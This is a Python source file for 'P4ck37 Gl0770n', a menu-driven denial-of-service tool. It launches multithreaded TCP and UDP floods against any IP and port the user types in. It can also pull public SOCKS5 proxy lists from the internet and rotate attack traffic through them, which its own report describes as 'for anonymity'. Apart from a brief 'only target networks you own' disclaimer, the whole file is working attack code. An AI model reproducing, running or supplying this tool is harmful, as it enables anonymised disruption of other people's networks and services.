import socket
import threading
import random
import argparse
import sys
import time
import os
import signal
import requests
try:
    import socks
    PROXY_SUPPORT = True
except ImportError:
    PROXY_SUPPORT = False
from colorama import init, Fore, Style, Back

# Initialize colorama
init(autoreset=True)

# Global variables for tracking
packets_sent = 0
bytes_sent = 0
start_time = None
attack_active = False
last_attack_stats = None
shutdown_requested = False
proxy_list = []
proxy_mode = False

def signal_handler(signum, frame):
    """Handle Ctrl+C gracefully"""
    global attack_active, shutdown_requested
    
    if attack_active:
        # If attack is running, just stop the attack
        attack_active = False
        print(f"\n\n{Fore.YELLOW + Style.BRIGHT}    🛑 Attack interrupted by user{Style.RESET_ALL}")
    else:
        # If no attack is running, exit the program
        shutdown_requested = True
        attack_active = False
        print(f"\n\n{Fore.YELLOW + Style.BRIGHT}    🛑 Shutdown signal received... Cleaning up gracefully{Style.RESET_ALL}")

def reset_shutdown_flag():
    """Reset shutdown flag for continuing operation"""
    global shutdown_requested
    shutdown_requested = False

# Register signal handler
signal.signal(signal.SIGINT, signal_handler)

def show_simple_loading():
    """Simple, clean loading bar animation with full ASCII title"""
    clear_screen()
    
    # Show full P4CK37 GL0TT0N title matching main UI
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    import time
    color_index = int(time.time() * 3) % len(colors)  # Faster color cycling during loading
    title_color = colors[color_index]
    
    print(f"\n{title_color + Style.BRIGHT}")
    print("    ██████╗ ██╗  ██╗ ██████╗██╗  ██╗██████╗ ███████╗    ██████╗ ██╗      ██████╗ ████████╗████████╗ ██████╗ ███╗   ██╗")
    print("    ██╔══██╗██║  ██║██╔════╝██║ ██╔╝╚════██╗╚════██║    ██╔════╝ ██║     ██╔═████╗╚══██╔══╝╚══██╔══╝██╔═████╗████╗  ██║")
    print("    ██████╔╝███████║██║     █████╔╝  █████╔╝    ██╔╝    ██║  ███╗██║     ██║██╔██║   ██║      ██║   ██║██╔██║██╔██╗ ██║")
    print("    ██╔═══╝ ╚════██║██║     ██╔═██╗  ╚═══██╗   ██╔╝     ██║   ██║██║     ████╔╝██║   ██║      ██║   ████╔╝██║██║╚██╗██║")
    print("    ██║          ██║╚██████╗██║  ██╗██████╔╝   ██║      ╚██████╔╝███████╗╚██████╔╝   ██║      ██║   ╚██████╔╝██║ ╚████║")
    print("    ╚═╝          ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝    ╚═╝       ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝      ╚═╝    ╚═════╝ ╚═╝  ╚═══╝")
    print(f"{Style.RESET_ALL}")
    print(f"{Fore.GREEN + Style.BRIGHT}                                    GLUTTON - Network Packet Devourer{Style.RESET_ALL}")
    print()
    
    # Simple loading bar
    print(f"{Fore.CYAN}    Initializing P4ck37 Gl0770n...{Style.RESET_ALL}")
    print()
    
    bar_length = 80  # Longer bar to match the ASCII width
    total_time = 3.0  # 3 seconds total
    steps = 100
    
    for i in range(steps + 1):
        progress = i / steps
        filled_length = int(bar_length * progress)
        bar = f"{'█' * filled_length}{'░' * (bar_length - filled_length)}"
        
        # Update color during loading for dynamic effect
        current_color_index = int(time.time() * 4) % len(colors)
        current_color = colors[current_color_index]
        
        print(f"\r{Fore.CYAN}    [{current_color}{bar}{Fore.CYAN}] {progress*100:.0f}%{Style.RESET_ALL}", end="", flush=True)
        time.sleep(total_time / steps)
    
    print(f"\n\n{Fore.GREEN + Style.BRIGHT}    ✅ Glutton ready to devour packets!{Style.RESET_ALL}")
    time.sleep(0.8)

def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Display the main banner with color-changing title"""
    # Color cycle for P4CK37 GL0TT0N
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    import random
    title_color = random.choice(colors)
    
    banner = f"""
{title_color + Style.BRIGHT}
    ██████╗ ██╗  ██╗ ██████╗██╗  ██╗██████╗ ███████╗    ██████╗ ██╗      ██████╗ ████████╗████████╗ ██████╗ ███╗   ██╗
    ██╔══██╗██║  ██║██╔════╝██║ ██╔╝╚════██╗╚════██║    ██╔════╝ ██║     ██╔═████╗╚══██╔══╝╚══██╔══╝██╔═████╗████╗  ██║
    ██████╔╝███████║██║     █████╔╝  █████╔╝    ██╔╝    ██║  ███╗██║     ██║██╔██║   ██║      ██║   ██║██╔██║██╔██╗ ██║
    ██╔═══╝ ╚════██║██║     ██╔═██╗  ╚═══██╗   ██╔╝     ██║   ██║██║     ████╔╝██║   ██║      ██║   ████╔╝██║██║╚██╗██║
    ██║          ██║╚██████╗██║  ██╗██████╔╝   ██║      ╚██████╔╝███████╗╚██████╔╝   ██║      ██║   ╚██████╔╝██║ ╚████║
    ╚═╝          ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝    ╚═╝       ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝      ╚═╝    ╚═════╝ ╚═╝  ╚═══╝
{Style.RESET_ALL}
{Fore.GREEN + Style.BRIGHT}    ╔═══════════════════════════════════════════════════════════════════════════════════════╗
    ║                       {Fore.YELLOW}🍽️  The Insatiable Network Devourer  🍽️{Fore.GREEN}                         ║
    ║                             {Fore.CYAN}Version 2.0 - Hungrier Than Ever{Fore.GREEN}                          ║
    ║                         {Fore.RED}⚠️  Feeds on Packets & Bandwidth  ⚠️{Fore.GREEN}                          ║
    ╚═══════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    
{Fore.YELLOW + Style.BRIGHT}    [!] CAUTION: {Fore.RED}This glutton has an ENDLESS appetite for network packets!{Style.RESET_ALL}
{Fore.YELLOW + Style.BRIGHT}    [!] Feed responsibly - Only target networks you own or have permission to test{Style.RESET_ALL}
{Fore.CYAN + Style.BRIGHT}    [!] NOTE: {Fore.MAGENTA}Proxies will only work with TCP Flood Attacks{Style.RESET_ALL}
    """
    print(banner)

def print_menu():
    """Display the main menu with proxy status"""
    proxy_status = f"{Fore.GREEN}ENABLED ({len(proxy_list)} proxies)" if proxy_mode and proxy_list else f"{Fore.RED}DISABLED"
    
    menu = f"""
{Fore.CYAN + Style.BRIGHT}    ╔═══════════════════════════════════════════════════════════════════════════════════════╗
    ║                                {Fore.WHITE}🎯 Attack Modes 🎯{Fore.CYAN}                                     ║
    ╠═══════════════════════════════════════════════════════════════════════════════════════╣
    ║  {Fore.GREEN}[1]{Fore.WHITE} TCP Flood Attack     {Fore.YELLOW}│{Fore.WHITE}  Overwhelm target with TCP connections                    ║
    ║  {Fore.GREEN}[2]{Fore.WHITE} UDP Flood Attack     {Fore.YELLOW}│{Fore.WHITE}  High-speed UDP packet bombardment                        ║
    ║  {Fore.GREEN}[3]{Fore.WHITE} Quick Mode           {Fore.YELLOW}│{Fore.WHITE}  Fast attack with default settings                        ║
    ╠═══════════════════════════════════════════════════════════════════════════════════════╣
    ║  {Fore.MAGENTA}[4]{Fore.WHITE} Proxy Settings      {Fore.YELLOW}│{Fore.WHITE}  Configure proxy chain attacks                           ║
    ╠═══════════════════════════════════════════════════════════════════════════════════════╣
    ║  {Fore.CYAN}Proxy Mode: {proxy_status}{Fore.CYAN}                                                        ║
    ╠═══════════════════════════════════════════════════════════════════════════════════════╣
    ║  {Fore.RED}[0]{Fore.WHITE} Exit                 {Fore.YELLOW}│{Fore.WHITE}  Terminate application                                    ║
    ╚═══════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(menu)

def print_status_bar(target, port, threads, attack_type, packet_size):
    """Display current attack status with proxy info"""
    proxy_info = f"Proxies: {Fore.GREEN}ON" if proxy_mode else f"Proxies: {Fore.RED}OFF"
    
    status = f"""
{Back.BLACK + Fore.WHITE + Style.BRIGHT}    ┌──────────────────────────────── STATUS ─────────────────────────────────┐
    │ Target: {Fore.YELLOW}{target:<15}{Fore.WHITE} │ Port: {Fore.YELLOW}{port:<6}{Fore.WHITE} │ Threads: {Fore.YELLOW}{threads:<4}{Fore.WHITE} │ Mode: {Fore.YELLOW}{attack_type:<8}{Fore.WHITE} │ Size: {Back.YELLOW + Fore.BLACK}[{packet_size}]{Back.BLACK + Fore.WHITE} │
    │ {proxy_info}{Fore.WHITE}                                                                       │
    └─────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}
    """
    print(status)

def print_live_stats():
    """Display live attack statistics with clean, minimal design"""
    global packets_sent, bytes_sent, start_time, attack_active
    
    if not attack_active or start_time is None:
        return
        
    duration = time.time() - start_time
    rate = packets_sent / max(duration, 1)
    
    # Calculate data transfer in different units
    kilobytes = bytes_sent / 1024
    megabytes = bytes_sent / (1024 * 1024)
    
    # Format duration nicely
    hours = int(duration // 3600)
    minutes = int((duration % 3600) // 60)
    seconds = int(duration % 60)
    
    if hours > 0:
        duration_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    else:
        duration_str = f"{minutes:02d}:{seconds:02d}"
    
    stats = f"""
{Fore.CYAN + Style.BRIGHT}    📊 LIVE ATTACK STATS{Style.RESET_ALL}
    {Fore.WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}
    
    {Fore.CYAN}Packets Sent:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{packets_sent:,}{Style.RESET_ALL}
    {Fore.CYAN}Duration:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{duration_str}{Style.RESET_ALL}
    {Fore.CYAN}Rate:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{rate:.1f} packets/sec{Style.RESET_ALL}
    
    {Fore.CYAN}Data Transferred:{Style.RESET_ALL}
      • {Fore.YELLOW + Style.BRIGHT}{bytes_sent:,}{Style.RESET_ALL} bytes
      • {Fore.YELLOW + Style.BRIGHT}{kilobytes:.2f}{Style.RESET_ALL} KB
      • {Fore.YELLOW + Style.BRIGHT}{megabytes:.2f}{Style.RESET_ALL} MB
    
    {Fore.CYAN}Status:{Style.RESET_ALL} {Fore.GREEN + Style.BRIGHT}ACTIVE - Glutton is FEEDING! 🍽️{Style.RESET_ALL}
    """
    print(stats)

def print_success_message(message):
    """Display success message"""
    print(f"\n{Fore.GREEN + Style.BRIGHT}    ✅ {message}{Style.RESET_ALL}")

def print_error_message(message):
    """Display error message"""
    print(f"\n{Fore.RED + Style.BRIGHT}    ❌ ERROR: {message}{Style.RESET_ALL}")

def print_info_message(message):
    """Display info message"""
    print(f"\n{Fore.CYAN + Style.BRIGHT}    ℹ️  INFO: {message}{Style.RESET_ALL}")

def get_user_input(prompt, input_type=str, default=None):
    """Get formatted user input with graceful interrupt handling"""
    if default:
        display_prompt = f"{Fore.CYAN + Style.BRIGHT}    ➤ {prompt} [{Fore.YELLOW}{default}{Fore.CYAN}]: {Style.RESET_ALL}"
    else:
        display_prompt = f"{Fore.CYAN + Style.BRIGHT}    ➤ {prompt}: {Style.RESET_ALL}"
    
    try:
        user_input = input(display_prompt).strip()
        if shutdown_requested:
            return None
        if not user_input and default:
            return input_type(default)
        return input_type(user_input) if user_input else None
    except (KeyboardInterrupt, EOFError):
        # This shouldn't happen anymore with signal handler, but just in case
        return None
    except ValueError:
        print_error_message(f"Invalid input type. Expected {input_type.__name__}")
        return None

def print_network_info():
    """Display network interface information"""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        info = f"""
{Fore.CYAN + Style.BRIGHT}    ╔═══════════════════════════════════════════════════════════════════════════════════════╗
    ║                              {Fore.WHITE}🌐 NETWORK INFORMATION 🌐{Fore.CYAN}                                ║
    ╠═══════════════════════════════════════════════════════════════════════════════════════╣
    ║  Hostname: {Fore.YELLOW}{hostname:<20}{Fore.CYAN}                                                       ║
    ║  Local IP: {Fore.YELLOW}{local_ip:<20}{Fore.CYAN}                                                       ║
    ║  Python Version: {Fore.YELLOW}{sys.version.split()[0]:<15}{Fore.CYAN}                                                      ║
    ║  Platform: {Fore.YELLOW}{sys.platform:<20}{Fore.CYAN}                                                       ║
    ╚═══════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(info)
    except Exception as e:
        print_error_message(f"Unable to retrieve network info: {e}")

def print_last_attack_report():
    """Display last attack statistics with proxy info"""
    global last_attack_stats
    
    if not last_attack_stats:
        return
    
    stats = last_attack_stats
    proxy_info = f"WITH {stats.get('proxy_count', 0)} PROXIES" if stats.get('proxy_mode', False) else "DIRECT CONNECTION"
    
    report = f"""
{Fore.MAGENTA + Style.BRIGHT}    📋 LAST ATTACK REPORT{Style.RESET_ALL}
    {Fore.WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}
    
    {Fore.MAGENTA}Target:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{stats['target']}{Style.RESET_ALL} | {Fore.MAGENTA}Port:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{stats['port']}{Style.RESET_ALL} | {Fore.MAGENTA}Protocol:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{stats['protocol']}{Style.RESET_ALL} | {Fore.MAGENTA}Threads:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{stats['threads']}{Style.RESET_ALL}
    {Fore.MAGENTA}Packet Size:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{stats['packet_size']} bytes{Style.RESET_ALL} | {Fore.MAGENTA}Connection:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{proxy_info}{Style.RESET_ALL}
    
    {Fore.MAGENTA}Results:{Style.RESET_ALL}
      • {Fore.MAGENTA}Packets Sent:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{stats['packets_sent']:,}{Style.RESET_ALL}
      • {Fore.MAGENTA}Data Transferred:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{stats['bytes_sent']:,} bytes{Style.RESET_ALL} ({Fore.YELLOW + Style.BRIGHT}{stats['kb_sent']:.2f} KB{Style.RESET_ALL} / {Fore.YELLOW + Style.BRIGHT}{stats['mb_sent']:.2f} MB{Style.RESET_ALL})
      • {Fore.MAGENTA}Duration:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{stats['duration']:.1f} seconds{Style.RESET_ALL}
      • {Fore.MAGENTA}Average Rate:{Style.RESET_ALL} {Fore.YELLOW + Style.BRIGHT}{stats['packets_sent']/max(stats['duration'], 1):.1f} packets/sec{Style.RESET_ALL}
    """
    print(report)

def print_glutton_ascii():
    """Display cool glutton ASCII art"""
    glutton_art = f"""
{Fore.GREEN + Style.BRIGHT}
    ███████████████████████████████████████████████████████████████████████████████████
    █                                                                                 █
    █                {Fore.YELLOW}👹 FEED ME YOUR PACKETS! I AM INSATIABLE! 👹{Fore.GREEN}                █
    █                          {Fore.RED}🍽️ NOM NOM NOM NOM NOM 🍽️{Fore.GREEN}                          █
    █                                                                                 █
    ███████████████████████████████████████████████████████████████████████████████████{Style.RESET_ALL}
    """
    print(glutton_art)

def fetch_proxies_from_api():
    """Fetch fresh proxy list from API"""
    try:
        print_info_message("Fetching fresh proxies from API...")
        
        # Focus on SOCKS5 proxies only for better UDP support
        sources = [
            'https://api.proxyscrape.com/v2/?request=get&protocol=socks5&format=textplain&country=all',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
            'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt'
        ]
        
        all_proxies = []
        for source in sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    proxies = response.text.strip().split('\n')
                    valid_proxies = [p.strip() for p in proxies if ':' in p and len(p.split(':')) == 2]
                    all_proxies.extend(valid_proxies)
                    print_info_message(f"Loaded {len(valid_proxies)} SOCKS5 proxies from source")
            except Exception as e:
                print_error_message(f"Failed to fetch from one source: {e}")
        
        # Remove duplicates
        unique_proxies = list(set(all_proxies))
        print_success_message(f"Total unique SOCKS5 proxies loaded: {len(unique_proxies)}")
        return unique_proxies
        
    except Exception as e:
        print_error_message(f"Failed to fetch proxies: {e}")
        return []

def test_proxy(proxy):
    """Test if a proxy is working"""
    try:
        ip, port = proxy.split(':')
        sock = socket.socket()
        sock.settimeout(3)
        result = sock.connect_ex((ip, int(port)))
        sock.close()
        return result == 0
    except:
        return False

def load_proxy_file():
    """Load proxies from local file"""
    try:
        with open('proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f.readlines() if ':' in line]
        print_success_message(f"Loaded {len(proxies)} proxies from file")
        return proxies
    except FileNotFoundError:
        print_error_message("proxies.txt not found")
        return []
    except Exception as e:
        print_error_message(f"Error loading proxy file: {e}")
        return []

def proxy_settings_menu():
    """Proxy configuration menu"""
    global proxy_mode, proxy_list
    
    while True:
        clear_screen()
        print_banner()
        
        status = f"{Fore.GREEN}ENABLED" if proxy_mode else f"{Fore.RED}DISABLED"
        proxy_count = len(proxy_list)
        
        settings_menu = f"""
{Fore.MAGENTA + Style.BRIGHT}    ╔═══════════════════════════════════════════════════════════════════════════════════════╗
    ║                              {Fore.WHITE}🔗 PROXY SETTINGS 🔗{Fore.MAGENTA}                                ║
    ╠═══════════════════════════════════════════════════════════════════════════════════════╣
    ║  Current Status: {status}{Fore.MAGENTA}                                                            ║
    ║  Loaded Proxies: {Fore.YELLOW}{proxy_count}{Fore.MAGENTA}                                                               ║
    ╠═══════════════════════════════════════════════════════════════════════════════════════╣
    ║  {Fore.GREEN}[1]{Fore.WHITE} Toggle Proxy Mode    {Fore.YELLOW}│{Fore.WHITE}  Enable/Disable proxy usage                          ║
    ║  {Fore.GREEN}[2]{Fore.WHITE} Load from API        {Fore.YELLOW}│{Fore.WHITE}  Fetch fresh proxies from internet                   ║
    ║  {Fore.GREEN}[3]{Fore.WHITE} Load from File       {Fore.YELLOW}│{Fore.WHITE}  Load proxies from proxies.txt                      ║
    ║  {Fore.GREEN}[4]{Fore.WHITE} Test Proxy Health    {Fore.YELLOW}│{Fore.WHITE}  Check which proxies are working                    ║
    ║  {Fore.GREEN}[5]{Fore.WHITE} Clear Proxy List     {Fore.YELLOW}│{Fore.WHITE}  Remove all loaded proxies                          ║
    ╠═══════════════════════════════════════════════════════════════════════════════════════╣
    ║  {Fore.RED}[0]{Fore.WHITE} Back to Main Menu   {Fore.YELLOW}│{Fore.WHITE}  Return to attack selection                          ║
    ╚═══════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(settings_menu)
        
        choice = get_user_input("Select an option", int)
        
        if choice == 1:
            proxy_mode = not proxy_mode
            status_msg = "ENABLED" if proxy_mode else "DISABLED"
            print_success_message(f"Proxy mode {status_msg}")
            if proxy_mode and not proxy_list:
                print_info_message("No proxies loaded. Use option 2 or 3 to load proxies.")
            time.sleep(2)
        
        elif choice == 2:
            if not PROXY_SUPPORT:
                print_error_message("PySocks not installed. Run: pip install PySocks")
                time.sleep(3)
                continue
            new_proxies = fetch_proxies_from_api()
            if new_proxies:
                proxy_list = new_proxies
                print_success_message(f"Loaded {len(proxy_list)} proxies from API")
            time.sleep(2)
        
        elif choice == 3:
            new_proxies = load_proxy_file()
            if new_proxies:
                proxy_list = new_proxies
            time.sleep(2)
        
        elif choice == 4:
            if not proxy_list:
                print_error_message("No proxies to test. Load proxies first.")
                time.sleep(2)
                continue
            
            print_info_message(f"Testing {len(proxy_list)} proxies...")
            working_proxies = []
            testing_interrupted = False
            
            for i, proxy in enumerate(proxy_list):
                # Check for shutdown signal during testing
                if shutdown_requested:
                    print(f"\n{Fore.YELLOW + Style.BRIGHT}    🛑 Health testing interrupted by user{Style.RESET_ALL}")
                    testing_interrupted = True
                    break
                    
                if test_proxy(proxy):
                    working_proxies.append(proxy)
                print(f"\rTesting... {i+1}/{len(proxy_list)} ({len(working_proxies)} working)", end="", flush=True)
            
            proxy_list = working_proxies
            print(f"\n")
            
            if testing_interrupted:
                # Reset shutdown flag since we're continuing in the menu
                reset_shutdown_flag()
                print_info_message(f"Testing stopped early - kept {len(working_proxies)} working proxies found so far")
            else:
                print_success_message(f"Found {len(working_proxies)} working proxies")
            time.sleep(2)
        
        elif choice == 5:
            proxy_list = []
            proxy_mode = False
            print_success_message("Proxy list cleared and proxy mode disabled")
            time.sleep(2)
        
        elif choice == 0:
            break

# Enhanced flooding functions with proxy support
def udp_flood(ip, port, packet_size):
    """UDP flooding function with optional proxy support"""
    global packets_sent, bytes_sent, attack_active
    
    try:
        if proxy_mode and proxy_list and PROXY_SUPPORT:
            # Use random proxy for this thread
            proxy = random.choice(proxy_list)
            proxy_ip, proxy_port = proxy.split(':')
            
            try:
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
                sock.settimeout(5)  # Add timeout for proxy connections
            except Exception as e:
                # If proxy fails, fall back to direct connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
        else:
            # Direct connection (no proxy)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
        
        data = random._urandom(packet_size)
        while attack_active and not shutdown_requested:
            try:
                sock.sendto(data, (ip, port))
                packets_sent += 1
                bytes_sent += packet_size
            except Exception as e:
                # If individual send fails, try a few more times before giving up
                continue
    except Exception as e:
        pass
    finally:
        try:
            sock.close()
        except:
            pass

def tcp_flood(ip, port, packet_size):
    """TCP flooding function with optional proxy support"""
    global packets_sent, bytes_sent, attack_active
    
    data = random._urandom(packet_size)
    while attack_active and not shutdown_requested:
        sock = None
        try:
            if proxy_mode and proxy_list and PROXY_SUPPORT:
                # Use random proxy for this connection
                proxy = random.choice(proxy_list)
                proxy_ip, proxy_port = proxy.split(':')
                
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            else:
                # Direct connection (no proxy)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            sock.settimeout(3)
            sock.connect((ip, port))
            sock.send(data)
            packets_sent += 1
            bytes_sent += packet_size
        except Exception:
            pass
        finally:
            try:
                if sock:
                    sock.close()
            except:
                pass

def start_attack(ip, port, protocol, threads, packet_size):
    """Start the flooding attack with enhanced UI and proxy support"""
    global attack_active, start_time, packets_sent, bytes_sent, shutdown_requested
    
    if shutdown_requested:
        return
    
    # Check proxy configuration
    if proxy_mode and not proxy_list:
        print_error_message("Proxy mode enabled but no proxies loaded!")
        print_info_message("Load proxies first or disable proxy mode")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return
    
    if proxy_mode and not PROXY_SUPPORT:
        print_error_message("Proxy mode enabled but PySocks not installed!")
        print_info_message("Run: pip install PySocks")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return
        
    attack_active = True
    start_time = time.time()
    packets_sent = 0
    bytes_sent = 0
    
    # Display attack info
    proxy_info = f" through {len(proxy_list)} proxies" if proxy_mode else " (direct connection)"
    print_info_message(f"Starting {protocol.upper()} flood on {ip}:{port}{proxy_info}")
    print_info_message(f"Unleashing {threads} threads of destruction...")
    
    # Start attack threads
    thread_list = []
    for _ in range(threads):
        if protocol == "udp":
            t = threading.Thread(target=udp_flood, args=(ip, port, packet_size))
        else:
            t = threading.Thread(target=tcp_flood, args=(ip, port, packet_size))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    print_success_message("The glutton is now feeding!")
    print(f"\n{Fore.YELLOW + Style.BRIGHT}    Press Ctrl+C to stop the attack...{Style.RESET_ALL}\n")
    
    try:
        while attack_active and not shutdown_requested:
            clear_screen()
            print_banner()
            print_glutton_ascii()
            print_status_bar(ip, port, threads, protocol.upper(), packet_size)
            print_live_stats()
            time.sleep(2)
    except:
        pass
    finally:
        # Ensure attack is stopped
        attack_active = False
        
        # Calculate final stats
        final_duration = time.time() - start_time
        final_kb = bytes_sent / 1024
        final_mb = bytes_sent / (1024 * 1024)
        
        # Store last attack stats
        global last_attack_stats
        last_attack_stats = {
            'target': ip,
            'port': port,
            'protocol': protocol.upper(),
            'threads': threads,
            'packet_size': packet_size,
            'packets_sent': packets_sent,
            'bytes_sent': bytes_sent,
            'duration': final_duration,
            'kb_sent': final_kb,
            'mb_sent': final_mb,
            'proxy_mode': proxy_mode,
            'proxy_count': len(proxy_list) if proxy_mode else 0
        }
        
        # Only show detailed stats if not shutting down completely
        if not shutdown_requested:
            print_info_message(f"Attack stopped - Final Statistics:")
            print(f"{Fore.YELLOW}    • Total packets sent: {packets_sent:,}")
            print(f"    • Total data transferred: {bytes_sent:,} bytes ({final_kb:.2f} KB / {final_mb:.2f} MB)")
            print(f"    • Attack duration: {final_duration:.1f} seconds")
            if proxy_mode:
                print(f"    • Used {len(proxy_list)} proxies for anonymity{Style.RESET_ALL}")
            else:
                print(f"    • Direct connection (no proxies){Style.RESET_ALL}")
            
            try:
                input(f"\n{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
            except:
                pass

def get_attack_params(protocol_name):
    """Get attack parameters from user (protocol already determined)"""
    if shutdown_requested:
        return None
        
    print_info_message(f"Configure your {protocol_name.upper()} attack parameters")
    
    ip = get_user_input("Enter target IP address", str)
    if not ip or shutdown_requested:
        return None
        
    port = get_user_input("Enter target port", int)
    if not port or shutdown_requested:
        return None
        
    threads = get_user_input("Number of threads", int, 100)
    if shutdown_requested:
        return None
        
    packet_size = get_user_input("Packet size in bytes", int, 1024)
    if shutdown_requested:
        return None
    
    return ip, port, threads, packet_size

def quick_attack():
    """Quick attack with default settings"""
    if shutdown_requested:
        return
        
    print_info_message("Quick Mode - Using default settings")
    
    ip = get_user_input("Enter target IP address", str)
    if not ip or shutdown_requested:
        return
        
    port = get_user_input("Enter target port", int, 80)
    if shutdown_requested:
        return
    
    print_info_message("Using defaults: UDP, 100 threads, 1024 byte packets")
    
    # Confirm attack
    confirm = get_user_input("Start attack? (y/n)", str, "n")
    if confirm and confirm.lower() == 'y' and not shutdown_requested:
        start_attack(ip, port, "udp", 100, 1024)

def graceful_exit():
    """Perform graceful exit"""
    global attack_active
    attack_active = False
    print_info_message("P4ck37 Gl0770n shutting down...")
    print_success_message("Goodbye! Stay ethical! 🎯")
    # Small delay to let threads finish
    time.sleep(1)

def main():
    """Main application loop with smart graceful shutdown handling"""
    global shutdown_requested
    
    # Show simple loading animation
    show_simple_loading()
    
    try:
        while not shutdown_requested:
            clear_screen()
            print_banner()
            print_network_info()
            print_last_attack_report()  # Show last attack stats if available
            print_menu()
            
            print(f"\n{Fore.BLACK + Back.WHITE + Style.BRIGHT}    Made By: _GR33D_ | Use responsibly and legally | Press Ctrl+C to stop{Style.RESET_ALL}")
            
            choice = get_user_input("Select an option", int)
            
            if shutdown_requested:
                break
            
            if choice == 1:
                print_info_message("TCP Flood Attack selected")
                params = get_attack_params("TCP")
                if params and not shutdown_requested:
                    ip, port, threads, packet_size = params
                    
                    # Confirm attack
                    confirm = get_user_input("Start TCP attack? (y/n)", str, "n")
                    if confirm and confirm.lower() == 'y' and not shutdown_requested:
                        start_attack(ip, port, "tcp", threads, packet_size)
            
            elif choice == 2:
                print_info_message("UDP Flood Attack selected")
                params = get_attack_params("UDP")
                if params and not shutdown_requested:
                    ip, port, threads, packet_size = params
                    
                    # Confirm attack
                    confirm = get_user_input("Start UDP attack? (y/n)", str, "n")
                    if confirm and confirm.lower() == 'y' and not shutdown_requested:
                        start_attack(ip, port, "udp", threads, packet_size)
            
            elif choice == 3:
                quick_attack()
            
            elif choice == 4:
                proxy_settings_menu()
            
            elif choice == 0:
                shutdown_requested = True
                break
            
            elif choice is None:
                # User input was interrupted
                continue
            
            else:
                print_error_message("Invalid option selected")
                time.sleep(2)
    
    except Exception as e:
        print_error_message(f"Unexpected error: {e}")
    finally:
        graceful_exit()

if __name__ == "__main__":
    main()